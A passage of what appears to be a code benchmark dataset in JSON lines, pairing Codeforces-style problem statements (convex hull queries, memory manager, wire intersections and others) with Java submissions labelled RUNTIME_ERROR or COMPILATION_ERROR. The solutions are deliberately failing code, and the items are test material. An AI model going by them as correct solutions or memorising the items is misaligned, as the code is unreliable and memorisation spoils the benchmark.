he'll have first to build several roads between cities in different provinces to merge the provinces. Your task is to determine the minimum number of roads Vasya needs to build so that it was possible to build the required network of tunnels in the resulting state.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers n, m and k (1\u2009\u2264\u2009n,\u2009k\u2009\u2264\u2009106,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009106). Each of the next m lines contains two integers. They are the numbers of cities connected by a corresponding road. No road connects city to itself and there is at most one road between each pair of cities.","output_spec":"Print a single number, the minimum number of additional roads.","notes":"NoteIn the first example only one province exists, so it is not necessary to build any tunnels or roads.In the second example two provinces exist. It is possible to merge the provinces by building a tunnel between cities 1 and 3.In the third example at least one additional road is necessary. For example it is possible to build additional road between cities 1 and 2 and build two tunnels between cities 1 and 3, 2 and 4 after that.","sample_inputs":["3 3 2\n1 2\n2 3\n3 1","4 2 2\n1 2\n3 4","4 0 2"],"sample_outputs":["0","0","1"]}
{"difficulty":2700,"lang":"Java 8","lang_cluster":"java","src_uid":"6220f4058f9325dfb211fb1dd86e9464","submission_id":"re_1207","tags":["data structures","geometry"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.StringTokenizer;\nimport java.util.TreeSet;\n\npublic class ConvexHull {\n\n    static class Point{\n        int x;\n        int y;\n        Point(int x, int y){\n            this.x = x;\n            this.y = y;\n        }\n    }\n\n    static int cross(Point a, Point b, Point c){\n       return (b.x - a.x) * (c.y - a.y) - (b.y - a.y)*(c.x - a.x);\n    }\n\n    static boolean isItOut(Point a, Point b, Point c, boolean upper){\n        if(a == null || b == null) {\n            return true;\n        }\n        if(upper && (a == b && a.y < c.y || cross(a,b,c) > 0)){\n            return true;\n        }\n        if(!upper && (a == b && a.y > c.y || cross(a,b,c) < 0)){\n            return true;\n        }\n\n        return false;\n    }\n\n    static void removePoint(TreeSet<Point> t, Point p, boolean right, boolean upper){\n        Point a = right ? t.ceiling(p) : t.floor(p);\n        if(a == null){\n            return;\n        }\n        if(a.x == p.x){\n            t.remove(a);\n            a = right ? t.ceiling(p) : t.floor(p);\n        }\n        if(a == null){\n            return;\n        }\n        Point b = right ? t.higher(a) : t.lower(a);\n        int sign = upper ? 1 : -1;\n        sign = right ? sign * 1 : sign * -1;\n        while(b != null && cross(p, a, b) * sign >= 0){\n\n            t.remove(a);\n            a = b;\n            b = right ? t.higher(a) : t.lower(a);\n\n        }\n    }\n\n    public static void main (String[] args) throws IOException {\n        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n        int q = Integer.parseInt(br.readLine());\n        \/\/upper hull\n        TreeSet<Point> upper = new TreeSet<>((a,b) -> a.x - b.x);\n        \/\/lower hull\n        TreeSet<Point> lower = new TreeSet<>((a,b) -> a.x - b.x);\n\n        while(q > 0){\n            StringTokenizer st = new StringTokenizer(br.readLine());\n            int t = Integer.parseInt(st.nextToken());\n            int x = Integer.parseInt(st.nextToken());\n            int y = Integer.parseInt(st.nextToken());\n            Point p = new Point(x,y);\n            Point ul = upper.floor(p);\n            Point ur = upper.ceiling(p);\n            Point ll = lower.floor(p);\n            Point lr = lower.ceiling(p);\n\n            boolean outupper = isItOut(ul, ur, p, true);\n            boolean outlower = isItOut(ll, lr, p, false);\n\n            if(t == 1){\n                \/\/add to convex hull\n                if(outupper){\n                    removePoint(upper, p, true, true);\n                    removePoint(upper, p, false, true);\n                    upper.add(p);\n                }\n                if(outlower){\n                    removePoint(lower, p, true, false);\n                    removePoint(lower, p, false, false);\n                    lower.add(p);\n                }\n\n            }else{\n                \/\/see if in convex hull\n                \/\/is it right or left?\n                System.out.println(outupper || outlower ? \"NO\" : \"YES\");\n                \/\/above top curve\n\n                \/\/below bottom curve\n\n            }\n            \/\/Point[] up = upper.toArray();\n            \/\/System.out.printf(\"UPPER:  \");\n            \/\/for(int i = 0; i < up.length; i ++){\n            \/\/    System.out.printf(\"%d %d   \", up[i].x, up[i].y);\n            \/\/}\n\n            \/\/Object[] low = lower.toArray();\n            \/\/System.out.printf(\"\\nLOWER:  \");\n            \/\/for(int i = 0; i < low.length; i ++){\n            \/\/    System.out.printf(\"%d %d   \", low[i].x, low[i].y);\n            \/\/}\n            \/\/System.out.println();\n\n            q--;\n        }\n\n    }\n\n}\n","description":"Once a walrus professor Plato asked his programming students to perform the following practical task. The students had to implement such a data structure that would support a convex hull on some set of points S. The input to the program had q queries of two types: 1. Add a point with coordinates (x,\u2009y) into the set S. Note that in this case the convex hull of S could have changed, and could have remained the same. 2. Say whether a point with coordinates (x,\u2009y) belongs to an area limited by the convex hull, including the border. All the students coped with the task. What about you?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer q (4\u2009\u2264\u2009q\u2009\u2264\u2009105).  Then follow q lines in the following way: \"t x y\", where t is the query type (1 or 2), and (x,\u2009y) are the coordinates of the point (\u2009-\u2009106\u2009\u2264\u2009x,\u2009y\u2009\u2264\u2009106, x and y are integers).  There is at least one query of type 2. It is guaranteed that the three queries of the first type follow first and the points given in the queries form a non-degenerative triangle. Also all the points added in S are distinct.","output_spec":"For each query of the second type print one string containing \"YES\", if the point lies inside the convex hull or on its border. Otherwise, print \"NO\".","notes":null,"sample_inputs":["8\n1 0 0\n1 2 0\n1 2 2\n2 1 0\n1 0 2\n2 1 1\n2 2 1\n2 20 -1"],"sample_outputs":["YES\nYES\nYES\nNO"]}
{"difficulty":1900,"lang":"Java 8","lang_cluster":"java","src_uid":"77919677f562a6fd1af64bc8cbc79de5","submission_id":"re_881","tags":["two pointers","binary search","sortings","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.*;\nimport java.util.*;\n\n\npublic class Main {\n    public static void main(String[] args) {\n        InputStream inputStream = System.in;\n        OutputStream outputStream = System.out;\n        InputReader in = new InputReader(inputStream);\n        OutputWriter out = new OutputWriter(outputStream);\n        TaskD solver = new TaskD();\n        solver.solve(in, out);\n        out.close();\n    }\n}\n\n\nclass TaskD {\n\n\n    public void solve(InputReader in, OutputWriter out) {\n        int n = in.nextInt();\n        int x = in.nextInt();\n\n        int firstTour[] = new int[n];\n        for (int i = 0; i < n; i++) {\n            firstTour[i] = in.nextInt();\n        }\n        int secondTour[] = new int[n];\n        for (int i = 0; i < n; i++) {\n            secondTour[i] = in.nextInt();\n        }\n        int worstPlace = 0;\n        Arrays.sort(firstTour);\n        Arrays.sort(secondTour);\n\n        int i = 0;\n        int j = n-1;\n        while(i < n && j >= 0) {\n            if(firstTour[i] + secondTour[j] >= x) {\n                i++;\n                j--;\n                worstPlace++;\n            } else {\n                i++;\n            }\n        }\n\n        out.printLine(\"1 \" + worstPlace);\n    }\n\n}\n\nclass InputReader {\n    public BufferedReader reader;\n    public StringTokenizer tokenizer;\n\n    public InputReader(InputStream stream) {\n        reader = new BufferedReader(new InputStreamReader(stream), 32768);\n        tokenizer = null;\n    }\n\n    public String next() {\n        while (tokenizer == null || !tokenizer.hasMoreTokens()) {\n            try {\n                tokenizer = new StringTokenizer(reader.readLine());\n            } catch (IOException e) {\n                throw new RuntimeException(e);\n            }\n        }\n        return tokenizer.nextToken();\n    }\n\n    public boolean hasNext() {\n        while (tokenizer == null || !tokenizer.hasMoreTokens()) {\n            try {\n                String line = reader.readLine();\n                if (line == null) {\n                    return false;\n                }\n                tokenizer = new StringTokenizer(line);\n            } catch (IOException e) {\n                throw new RuntimeException(e);\n            }\n        }\n        return true;\n    }\n\n    public int nextInt() {\n        return Integer.parseInt(next());\n    }\n    public long nextLong() {\n        return Long.parseLong(next());\n    }\n\n}\n\nclass OutputWriter {\n    private final PrintWriter writer;\n\n    public OutputWriter(OutputStream outputStream) {\n        writer = new PrintWriter(new BufferedWriter(new OutputStreamWriter(outputStream)));\n    }\n\n    public OutputWriter(Writer writer) {\n        this.writer = new PrintWriter(writer);\n    }\n\n    public void print(Object... objects) {\n        for (int i = 0; i < objects.length; i++) {\n            if (i != 0) {\n                writer.print(' ');\n            }\n            writer.print(objects[i]);\n        }\n    }\n\n    public void printLine(Object... objects) {\n        print(objects);\n        writer.println();\n    }\n\n    public void close() {\n        writer.close();\n    }\n\n}","description":"A boy named Vasya has taken part in an Olympiad. His teacher knows that in total Vasya got at least x points for both tours of the Olympiad. The teacher has the results of the first and the second tour of the Olympiad but the problem is, the results have only points, no names. The teacher has to know Vasya's chances.Help Vasya's teacher, find two numbers \u2014 the best and the worst place Vasya could have won. Note that the total results' table sorts the participants by the sum of points for both tours (the first place has the participant who has got the most points). If two or more participants have got the same number of points, it's up to the jury to assign places to them according to their choice. It is guaranteed that each participant of the Olympiad participated in both tours of the Olympiad.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n,\u2009x (1\u2009\u2264\u2009n\u2009\u2264\u2009105;\u00a00\u2009\u2264\u2009x\u2009\u2264\u20092\u00b7105) \u2014 the number of Olympiad participants and the minimum number of points Vasya earned. The second line contains n space-separated integers: a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u2009105) \u2014 the participants' points in the first tour. The third line contains n space-separated integers: b1,\u2009b2,\u2009...,\u2009bn (0\u2009\u2264\u2009bi\u2009\u2264\u2009105) \u2014 the participants' points in the second tour. The participants' points are given in the arbitrary order. It is guaranteed that Vasya was present in the Olympiad \u2014 there are two integers i,\u2009j (1\u2009\u2264\u2009i,\u2009j\u2009\u2264\u2009n) such, that ai\u2009+\u2009bj\u2009\u2265\u2009x.","output_spec":"Print two space-separated integers \u2014 the best and the worst place Vasya could have got on the Olympiad.","notes":"NoteIn the first text sample all 5 participants earn 2 points each in any case. Depending on the jury's decision, Vasya can get the first (the best) as well as the last (the worst) fifth place.In the second test sample in the best case scenario Vasya wins again: he can win 12 points and become the absolute winner if the total results' table looks like that \u2014 {4:8, 6:4, 3:6, 4:4, 4:3, 5:0}.In this table all participants are sorted by decreasing points and we can see how much a participant earned in the first and in the second tour.In the worst case scenario Vasya can get the fifth place if the table looks like that \u2014 {4:8, 4:6, 6:4, 5:4, 4:3, 3:0}, and he earned 4 and 3 points in the first and second tours, correspondingly.","sample_inputs":["5 2\n1 1 1 1 1\n1 1 1 1 1","6 7\n4 3 5 6 4 4\n8 6 0 4 3 4"],"sample_outputs":["1 5","1 5"]}
{"difficulty":1900,"lang":"Java 8","lang_cluster":"java","src_uid":"8c2e0cd780cf9390e933e28e57643cba","submission_id":"re_1193","tags":["geometry","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\nimport java.util.Scanner;\nimport java.util.Set;\n\npublic class Solution {\n\t\n\tprivate static Scanner sc;\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tsc = new Scanner(System.in);\n\t\t\n\t\tint n = sc.nextInt();\n\t\tdouble[][] A = new double [n][2];\n\t\tMap<Double, Integer> M1 = new HashMap<Double, Integer>();\n\t\tMap<Double, Set<Double>> M2 = new HashMap<Double, Set<Double>>();\n\t\t\n\t\tfor (int i = 0; i < n ; ++i) {\n\t\t\tA[i][0] = sc.nextDouble();\n\t\t\tA[i][1] = sc.nextDouble();\n\t\t}\n\t\t\n\t\tfor (int i = 0; i < n; ++i) {\n\t\t\tfor (int j = i + 1; j < n; ++j) {\n\t\t\t\t\n\t\t\t\tdouble m;\n\t\t\t\t\n\t\t\t\tif (A[i][0] - A[j][0] == 0) {\n\t\t\t\t\tm = 2000000000;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tm = (A[i][1] - A[j][1]) \/ ( A[i][0] - A[j][0]);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (!M1.containsKey(m)) {\n\t\t\t\t\tM1.put(m, 0);\n\t\t\t\t\tM2.put(m, new HashSet<Double>());\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tint cnt = M1.get(m);\n\t\t\t\t\n\t\t\t\tM1.put(m, cnt + 1);\n\t\t\t\t\n\t\t\t\tif (m == 2000000000) {\n\t\t\t\t\tM2.get(m).add(A[i][0]);\n\t\t\t\t} else {\n\t\t\t\t\tM2.get(m).add(A[i][1] - m * A[i][0]);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\tlong tot = 0;\n\t\tlong cnt = 0;\n\t\t\n\t\tfor (double m : M2.keySet()) {\n\t\t\ttot += M2.get(m).size();\n\t\t}\n\t\t\n\t\tfor (double m : M2.keySet()) {\n\t\t\tcnt += (tot - M2.get(m).size()) * M2.get(m).size();\n\t\t}\n\t\t\n\t\tSystem.out.println(cnt \/ 2);\n\t\t\n\t\tsc.close();\n\t}\n}\n","description":"This problem is same as the next one, but has smaller constraints.It was a Sunday morning when the three friends Selena, Shiro and Katie decided to have a trip to the nearby power station (do not try this at home). After arriving at the power station, the cats got impressed with a large power transmission system consisting of many chimneys, electric poles, and wires. Since they are cats, they found those things gigantic.At the entrance of the station, there is a map describing the complicated wiring system. Selena is the best at math among three friends. He decided to draw the map on the Cartesian plane. Each pole is now a point at some coordinates $$$(x_i, y_i)$$$. Since every pole is different, all of the points representing these poles are distinct. Also, every two poles are connected with each other by wires. A wire is a straight line on the plane infinite in both directions. If there are more than two poles lying on the same line, they are connected by a single common wire.Selena thinks, that whenever two different electric wires intersect, they may interfere with each other and cause damage. So he wonders, how many pairs are intersecting? Could you help him with this problem?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ ($$$2 \\le n \\le 50$$$)\u00a0\u2014 the number of electric poles. Each of the following $$$n$$$ lines contains two integers $$$x_i$$$, $$$y_i$$$ ($$$-10^4 \\le x_i, y_i \\le 10^4$$$)\u00a0\u2014 the coordinates of the poles. It is guaranteed that all of these $$$n$$$ points are distinct.","output_spec":"Print a single integer\u00a0\u2014 the number of pairs of wires that are intersecting.","notes":"NoteIn the first example:  In the second example:  Note that the three poles $$$(0, 0)$$$, $$$(0, 2)$$$ and $$$(0, 4)$$$ are connected by a single wire.In the third example:  ","sample_inputs":["4\n0 0\n1 1\n0 3\n1 2","4\n0 0\n0 2\n0 4\n2 0","3\n-1 -1\n1 0\n3 1"],"sample_outputs":["14","6","0"]}
{"difficulty":1600,"lang":"Java 8","lang_cluster":"java","src_uid":"a6cba17c5ddb93f6741e00280fb6c54c","submission_id":"re_530","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/**\n * ******* Created on 19\/9\/19 3:33 AM*******\n *\/\n\nimport java.io.*;\nimport java.util.*;\n\npublic class B7 {\n    public static void main(String[] args) throws IOException {\n        try (Input input = new StandardInput(); PrintWriter writer = new PrintWriter(System.out)) {\n            int t = input.nextInt();\n            int m = input.nextInt();\n            int[] arr = new int[m];\n            for(int i=0;i<m;i++) {\n                arr[i]=0;\n            }\n            int id =0;\n            while(t-- >0){\n                String s = input.next();\n                if(s.equals(\"defragment\")){\n                    int i=0, j=0;\n                    while(arr[j]!=0 && j<m)j++;\n                    while(arr[i]==0 && i<m)i++;\n                    for(;i<m;i++){\n                        if(arr[i]!=0 && i>j){\n                            arr[j]= arr[i];\n                            arr[i]=0;\n                            j++;\n                        }\n                        while(arr[j]!=0 && j<m) j++;\n                    }\n                }else if(s.equals(\"alloc\")){\n                    int size = input.nextInt();\n                    int cnt1 =0, pos =-1;\n                    for(int i=0;i<m;i++){\n                        if(arr[i]==0)cnt1++;\n                        else cnt1 =0;\n                        if(cnt1 ==size){\n                            id++;\n                            pos =i;\n                            break;\n                        }\n                    }\n                    if(pos ==-1){\n                        System.out.println(\"NULL\");\n                    }else{\n                        System.out.println(id);\n                        for(int i=pos, k=0;k<size;k++,i--)\n                            arr[i]=id;\n                    }\n                }else{\n                    int ids = input.nextInt();\n                    boolean flag =false;\n                    for(int i=0;i<m;i++){\n                        if(arr[i]==ids){\n                            flag =true;\n                            arr[i]=0;\n                        }\n                    }\n                    if(!flag){\n                        System.out.println(\"ILLEGAL_ERASE_ARGUMENT\");\n                    }\n                }\n            }\n        }\n    }\n\n    interface Input extends Closeable {\n        String next() throws IOException;\n\n        default int nextInt() throws IOException {\n            return Integer.parseInt(next());\n        }\n\n        default long nextLong() throws IOException {\n            return Long.parseLong(next());\n        }\n\n        default double nextDouble() throws IOException {\n            return Double.parseDouble(next());\n        }\n\n        default int[] readIntArray() throws IOException {\n            return readIntArray(nextInt());\n        }\n\n        default int[] readIntArray(int size) throws IOException {\n            int[] array = new int[size];\n            for (int i = 0; i < array.length; i++) {\n                array[i] = nextInt();\n            }\n            return array;\n        }\n\n        default long[] readLongArray(int size) throws IOException {\n            long[] array = new long[size];\n            for (int i = 0; i < array.length; i++) {\n                array[i] = nextLong();\n            }\n            return array;\n        }\n    }\n\n    private static class StandardInput implements Input {\n        private final BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n\n        private StringTokenizer stringTokenizer;\n\n        @Override\n        public void close() throws IOException {\n            reader.close();\n        }\n\n        @Override\n        public String next() throws IOException {\n            if (stringTokenizer == null || !stringTokenizer.hasMoreTokens()) {\n                stringTokenizer = new StringTokenizer(reader.readLine());\n            }\n            return stringTokenizer.nextToken();\n        }\n    }\n}\n","description":"There is little time left before the release of the first national operating system BerlOS. Some of its components are not finished yet \u2014 the memory manager is among them. According to the developers' plan, in the first release the memory manager will be very simple and rectilinear. It will support three operations:   alloc n \u2014 to allocate n bytes of the memory and return the allocated block's identifier x;  erase x \u2014 to erase the block with the identifier x;  defragment \u2014 to defragment the free memory, bringing all the blocks as close to the beginning of the memory as possible and preserving their respective order; The memory model in this case is very simple. It is a sequence of m bytes, numbered for convenience from the first to the m-th.The first operation alloc n takes as the only parameter the size of the memory block that is to be allocated. While processing this operation, a free block of n successive bytes is being allocated in the memory. If the amount of such blocks is more than one, the block closest to the beginning of the memory (i.e. to the first byte) is prefered. All these bytes are marked as not free, and the memory manager returns a 32-bit integer numerical token that is the identifier of this block. If it is impossible to allocate a free block of this size, the function returns NULL.The second operation erase x takes as its parameter the identifier of some block. This operation frees the system memory, marking the bytes of this block as free for further use. In the case when this identifier does not point to the previously allocated block, which has not been erased yet, the function returns ILLEGAL_ERASE_ARGUMENT.The last operation defragment does not have any arguments and simply brings the occupied memory sections closer to the beginning of the memory without changing their respective order.In the current implementation you are to use successive integers, starting with 1, as identifiers. Each successful alloc operation procession should return following number. Unsuccessful alloc operations do not affect numeration.You are to write the implementation of the memory manager. You should output the returned value for each alloc command. You should also output ILLEGAL_ERASE_ARGUMENT for all the failed erase commands.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two positive integers t and m (1\u2009\u2264\u2009t\u2009\u2264\u2009100;1\u2009\u2264\u2009m\u2009\u2264\u2009100), where t \u2014 the amount of operations given to the memory manager for processing, and m \u2014 the available memory size in bytes. Then there follow t lines where the operations themselves are given. The first operation is alloc n (1\u2009\u2264\u2009n\u2009\u2264\u2009100), where n is an integer. The second one is erase x, where x is an arbitrary 32-bit integer numerical token. The third operation is defragment. ","output_spec":"Output the sequence of lines. Each line should contain either the result of alloc operation procession , or ILLEGAL_ERASE_ARGUMENT as a result of failed erase operation procession. Output lines should go in the same order in which the operations are processed. Successful procession of alloc operation should return integers, starting with 1, as the identifiers of the allocated blocks.","notes":null,"sample_inputs":["6 10\nalloc 5\nalloc 3\nerase 1\nalloc 6\ndefragment\nalloc 6"],"sample_outputs":["1\n2\nNULL\n3"]}
{"difficulty":2600,"lang":"Java 8","lang_cluster":"java","src_uid":"a9bad412597726f8cdc0cfa2da891bc4","submission_id":"re_438","tags":["dp","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*;\n\npublic class LizardsAndBasements2 {\n    \n    static int N, a, b;\n    static int[] h;\n    static Integer[][][][] dp;\n    static State[][][][] path;\n    static final int INF = (int)1e9;\n    \n    static class State {\n        int i, p, c, n;\n        State(int i, int p, int c, int n) {\n            this.i = i;\n            this.p = p;\n            this.c = c;\n            this.n = n;\n        }\n        \n        @Override\n        public String toString() {\n            return \"(\" + i + \", \" + p + \", \" + c + \", \" + n + \")\";\n        }\n    }\n    \n    static int solve(int index, int prev, int cur, int next) {\n        prev = Math.max(0, prev);\n        cur = Math.max(0, cur);\n        next = Math.max(0, next);\n        \n        if (dp[index][prev][cur][next] != null) {\n            return dp[index][prev][cur][next];\n        }\n        \n        int ans = INF;\n        if (index == N - 1) {\n            return ans = prev + cur == 0 ? 0 : INF;\n        } else if (index == N - 2) {\n            if (next > 0) {\n                ans = 1 + solve(index, prev - b, cur - a, next - b);\n                path[index][prev][cur][next] = new State(index, prev - b, cur - a, next - b);\n            } else {\n                ans = prev + cur + next == 0 ? 0 : INF;\n            }\n        } else {\n            if (prev > 0) {\n                ans = 1 + solve(index, prev - b, cur - a, next - b);\n                path[index][prev][cur][next] = new State(index, prev - b, cur - a, next - b);\n            } else {\n                if (cur > 0) {\n                    ans = 1 + solve(index, prev - b, cur - a, next - b);\n                    path[index][prev][cur][next] = new State(index, prev - b, cur - a, next - b);\n                }\n                int nn = index < N - 2 ? h[index + 2] : 0;\n                int ans2 = solve(index + 1, cur, next, nn);\n                if (ans2 < ans) {\n                    ans = ans2;\n                    path[index][prev][cur][next] = new State(index + 1, cur, next, nn);\n                }\n            }\n        }\n        return dp[index][prev][cur][next] = ans;\n    }\n    \n    static void printPath() {\n        State state = new State(1, h[0], h[1], h[2]);\n        \n        while (state != null) {\n            if (Math.max(0, state.p) + Math.max(0, state.c) + Math.max(0, state.n) > 0)\n                System.out.print((state.i + 1) + \" \");\n            state = path[state.i][Math.max(0, state.p)][Math.max(0, state.c)][Math.max(0, state.n)];\n        }\n        System.out.println();\n    }\n    \n    public static void main(String[] args) {\n        Scanner in = new Scanner(System.in);\n        \n        N = in.nextInt();\n        a = in.nextInt();\n        b = in.nextInt();\n        h = new int[N];\n        for (int i = 0; i < N; i++) {\n            h[i] = in.nextInt() + 1;\n        }\n        \n        dp = new Integer[20][20][20][20];\n        path = new State[20][20][20][20];\n        int ans = solve(1, h[0], h[1], h[2]);\n        System.out.println(ans);\n        printPath();\n        \n        in.close();\n        System.exit(0);\n    }\n}","description":"This is simplified version of the problem used on the original contest. The original problem seems to have too difiicult solution. The constraints for input data have been reduced.Polycarp likes to play computer role-playing game \u00abLizards and Basements\u00bb. At the moment he is playing it as a magician. At one of the last levels he has to fight the line of archers. The only spell with which he can damage them is a fire ball. If Polycarp hits the i-th archer with his fire ball (they are numbered from left to right), the archer loses a health points. At the same time the spell damages the archers adjacent to the i-th (if any) \u2014 they lose b (1\u2009\u2264\u2009b\u2009&lt;\u2009a\u2009\u2264\u200910) health points each.As the extreme archers (i.e. archers numbered 1 and n) are very far, the fire ball cannot reach them. Polycarp can hit any other archer with his fire ball.The amount of health points for each archer is known. An archer will be killed when this amount is less than 0. What is the minimum amount of spells Polycarp can use to kill all the enemies?Polycarp can throw his fire ball into an archer if the latter is already killed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n,\u2009a,\u2009b (3\u2009\u2264\u2009n\u2009\u2264\u200910; 1\u2009\u2264\u2009b\u2009&lt;\u2009a\u2009\u2264\u200910). The second line contains a sequence of n integers \u2014 h1,\u2009h2,\u2009...,\u2009hn (1\u2009\u2264\u2009hi\u2009\u2264\u200915), where hi is the amount of health points the i-th archer has.","output_spec":"In the first line print t \u2014 the required minimum amount of fire balls. In the second line print t numbers \u2014 indexes of the archers that Polycarp should hit to kill all the archers in t shots. All these numbers should be between 2 and n\u2009-\u20091. Separate numbers with spaces. If there are several solutions, output any of them. Print numbers in any order.","notes":null,"sample_inputs":["3 2 1\n2 2 2","4 3 1\n1 4 1 1"],"sample_outputs":["3\n2 2 2","4\n2 2 3 3"]}
{"difficulty":1800,"lang":"Java 6","lang_cluster":"java","src_uid":"b81e7a786e4083cf7188f718bc045a85","submission_id":"re_226","tags":["greedy","math"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.*;\nimport java.util.*;\n\n\n\npublic class D {\n\tString line = null;\n\tString error = \"errtype\";\n\tString voi = \"void\";\n\tpublic void run() throws Exception{\n\n\t\tBufferedReader br = null;\n\t\tFile file = new File(\"input.txt\");\n\t\tif(file.exists()){\n\t\t\tbr = new BufferedReader(new FileReader(\"input.txt\"));\n\t\t}\n\t\telse{\n\t\t\tbr = new BufferedReader(new InputStreamReader(System.in));\n\t\t}\n\t\n\t\tline = br.readLine();\n\t\tint N = Integer.parseInt(line);\n\t\t\n\t\tint c = 0;\n\t\tList<Widgit> list = new ArrayList<Widgit>();\n\t\t\n\t\twhile(c < N){\n\t\t\tline = br.readLine();\n\t\t\tString[] ls = line.split(\" \");\n\t\t\tif(ls[0].equals(\"Widget\")){\n\t\t\t\tString s = ls[1];\n\t\t\t\tint p1 = s.indexOf('(');\n\t\t\t\tint p2 = s.indexOf(',');\n\t\t\t\tint p3 = s.indexOf(')');\n\t\t\t\tString name = s.substring(0, p1);\n\t\t\t\tString xs = s.substring(p1+1, p2);\n\t\t\t\tString ys = s.substring(p2+1, p3);\n\t\t\t\tint x = Integer.parseInt(xs);\n\t\t\t\tint y = Integer.parseInt(ys);\n\t\t\t\tWidgit w = new Widgit(x, y);\n\t\t\t\tw.name = name;\n\t\t\t\tlist.add(w);\n\t\t\t}\n\t\t\telse if(ls[0].equals(\"VBox\")){\n\t\t\t\tString name = ls[1];\n\t\t\t\tVBox v = new VBox();\n\t\t\t\tv.name = name;\n\t\t\t\tlist.add(v);\n\t\t\t}\n\t\t\telse if(ls[0].equals(\"HBox\")){\n\t\t\t\tString name = ls[1];\n\t\t\t\tHBox v = new HBox();\n\t\t\t\tv.name = name;\n\t\t\t\tlist.add(v);\n\t\t\t}\n\t\t\telse{\n\t\t\t\tString s = ls[0];\n\t\t\t\tif(s.contains(\".pack(\")){\n\t\t\t\t\tint p1 = s.indexOf('.');\n\t\t\t\t\tint p2 = s.indexOf('(');\n\t\t\t\t\tint p3 = s.indexOf(')');\n\t\t\t\t\tString parn = s.substring(0, p1);\n\t\t\t\t\tString chin = s.substring(p2+1, p3);\n\t\t\t\t\t\n\t\t\t\t\tBoxbase box = null;\n\t\t\t\t\tWidgit w = null;\n\t\t\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\t\t\tif(parn.equals(list.get(i).name)){\n\t\t\t\t\t\t\tbox = (Boxbase)list.get(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if(chin.equals(list.get(i).name)){\n\t\t\t\t\t\t\tw = list.get(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif(w != null){\n\t\t\t\t\t\tbox.pack(w);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if(s.contains(\".set_border(\")){\n\t\t\t\t\tint p1 = s.indexOf('.');\n\t\t\t\t\tint p2 = s.indexOf('(');\n\t\t\t\t\tint p3 = s.indexOf(')');\n\t\t\t\t\tString name = s.substring(0, p1);\n\t\t\t\t\tString atai = s.substring(p2+1, p3);\n\t\t\t\t\tint num = Integer.parseInt(atai);\n\t\t\t\t\t\n\t\t\t\t\tBoxbase box = null;\n\t\t\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\t\t\tif(name.equals(list.get(i).name)){\n\t\t\t\t\t\t\tbox = (Boxbase)list.get(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\t\tif(box != null){\n\t\t\t\t\t\tbox.setBorder(num);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if(s.contains(\".set_spacing(\")){\n\t\t\t\t\tint p1 = s.indexOf('.');\n\t\t\t\t\tint p2 = s.indexOf('(');\n\t\t\t\t\tint p3 = s.indexOf(')');\n\t\t\t\t\tString name = s.substring(0, p1);\n\t\t\t\t\tString atai = s.substring(p2+1, p3);\n\t\t\t\t\tint num = Integer.parseInt(atai);\n\t\t\t\t\t\n\t\t\t\t\tBoxbase box = null;\n\t\t\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\t\t\tif(name.equals(list.get(i).name)){\n\t\t\t\t\t\t\tbox = (Boxbase)list.get(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\t\tif(box != null){\n\t\t\t\t\t\tbox.setSpace(num);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\tc++;\n\t\t}\n\t\tList<String> namelist = new ArrayList<String>();\n\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\tnamelist.add(list.get(i).name);\n\t\t}\n\t\t\n\t\tString[] slist = new String[0];\n\t\tslist = namelist.toArray(slist);\n\t\tArrays.sort(slist);\n\t\tfor(int i = 0; i < slist.length; i++){\n\t\t\tString name = slist[i];\n\t\t\t\n\t\t\tfor(int j = 0; j < list.size(); j++){\n\t\t\t\tif(list.get(j).name.equals(name)){\n\t\t\t\t\tString size = list.get(j).getSize();\n\t\t\t\t\tSystem.out.println(name + \" \" + size);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t}\n\t\t\n\t}\n\t\n\tprivate class Widgit{\n\t\tpublic String name = \"\";\n\t\t\n\t\tpublic int getSizeX(){\n\t\t\treturn x;\n\t\t}\n\t\tpublic int getSizeY(){\n\t\t\treturn y;\n\t\t}\n\t\t\n\t\tpublic Widgit(){\n\t\t\t\n\t\t}\n\t\t\n\t\tpublic Widgit(int x, int y){\n\t\t\tthis.x = x;\n\t\t\tthis.y = y;\n\t\t}\n\t\t\n\t\tpublic String getSize(){\n\t\t\tString ans = x + \" \" + y;\n\t\t\treturn ans;\n\t\t}\n\t\t\n\t\tint x = 0;\n\t\tint y = 0;\n\t}\n\t\n\tprivate class Boxbase extends Widgit{\n\t\tint 